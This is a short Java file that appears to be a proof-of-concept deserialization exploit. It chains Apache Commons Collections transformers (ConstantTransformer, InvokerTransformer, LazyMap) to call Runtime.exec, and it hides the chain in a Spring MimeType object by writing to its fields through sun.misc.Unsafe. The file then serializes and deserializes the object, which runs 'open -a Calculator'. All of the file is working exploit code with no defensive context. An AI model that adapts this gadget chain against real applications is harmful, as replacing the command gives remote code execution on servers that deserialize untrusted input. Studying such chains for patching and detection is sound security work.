package Test;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.springframework.util.MimeType;
import sun.misc.Unsafe;
import java.lang.reflect.Field;
import java.util.*;

import utils.*;

public class Test {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"open -a Calculator"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap map = new HashMap();
        Map map1 = LazyMap.decorate(map, chainedTransformer);

        Field field = Unsafe.class.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe)field.get((Object)null);
        MimeType mimeType = (MimeType) unsafe.allocateInstance(MimeType.class);
        unsafe.putObject(mimeType,unsafe.objectFieldOffset(MimeType.class.getDeclaredField("parameters")),map1);

        String pld =  SerializeUtils.serializeBase64(mimeType);
        SerializeUtils.unserializeBase64(pld);
    }
}